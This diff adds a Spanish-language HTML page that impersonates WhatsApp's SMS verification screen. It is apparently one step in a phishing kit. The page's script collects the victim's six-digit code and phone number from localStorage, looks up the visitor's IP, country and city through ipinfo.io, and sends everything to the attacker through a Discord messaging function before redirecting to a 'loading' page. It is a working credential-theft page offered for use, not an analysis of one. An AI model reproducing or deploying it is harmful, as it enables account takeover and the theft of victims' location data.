@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp - Código SMS</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script src="config.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(120deg, #e0ffe8 0%, #b8e1fc 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #075e54;
+    }
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .logo {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .logo img {
+      width: 64px;
+      height: 64px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 15px;
+      margin-bottom: 24px;
+      color: #128c7e;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+    button {
+      background-color: #25d366;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #075e54;
+    }
+    .error {
+      color: #d32f2f;
+      font-size: 14px;
+      margin-top: -8px;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h1>Ingresa el código SMS</h1>
+    <p>Hemos enviado un código de 6 dígitos a tu número de WhatsApp.</p>
+    <form id="smsForm">
+      <input type="text" id="codigoSMS" placeholder="Código SMS" maxlength="6" required inputmode="numeric" pattern="[0-9]{6}">
+      <div class="error" id="errorMensaje" style="display:none;"></div>
+      <button type="submit">Verificar</button>
+    </form>
+  </div>
+
+  <script>
+    // Bloquear letras en tiempo real
+    document.getElementById('codigoSMS').addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '');
+    });
+
+    document.getElementById('smsForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const codigoSMS = document.getElementById('codigoSMS').value.trim();
+      const telefono = localStorage.getItem('telefonoUsuario') || 'No disponible';
+      const codigoPantalla = localStorage.getItem('codigoPantalla') || '';
+      const errorDiv = document.getElementById('errorMensaje');
+
+      // Validar que sean exactamente 6 dígitos numéricos
+      if (!/^\d{6}$/.test(codigoSMS)) {
+        errorDiv.textContent = '❌ El código debe contener exactamente 6 números.';
+        errorDiv.style.display = 'block';
+        return;
+      }
+
+      if (codigoSMS === codigoPantalla) {
+        errorDiv.textContent = '❌ El código SMS no puede ser el mismo que el de pantalla.';
+        errorDiv.style.display = 'block';
+        return;
+      } else {
+        errorDiv.style.display = 'none';
+      }
+
+      localStorage.setItem('codigoSMS', codigoSMS);
+
+      fetch('https://ipinfo.io/json?token=')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          const pais = data.country || 'No disponible';
+          const ciudad = data.city || 'No disponible';
+
+          const mensaje = `📩 **Código SMS**\n\n📱 **Teléfono**: ${telefono}\n🔢 **Código**: ${codigoSMS}\n🌍 **IP**: ${ip}\n🏳️ **País**: ${pais}\n📍 **Ciudad**: ${ciudad}\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+
+          enviarMensajeDiscord(mensaje)
+            .catch(error => console.warn('Error al enviar a Discord:', error))
+            .finally(() => {
+              window.location.href = 'cargando3.html';
+            });
+        })
+        .catch(error => {
+          console.warn('No se pudo obtener IP y país:', error);
+          const mensaje = `📩 **Código SMS**\n\n📱 **Teléfono**: ${telefono}\n🔢 **Código**: ${codigoSMS}\n🌍 **IP**: No disponible\n🏳️ **País**: No disponible\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+
+          enviarMensajeDiscord(mensaje)
+            .catch(error => console.warn('Error al enviar a Discord:', error))
+            .finally(() => {
+              window.location.href = 'cargando3.html';
+            });
+        });
+    });
+  </script>
+</body>
+</html>
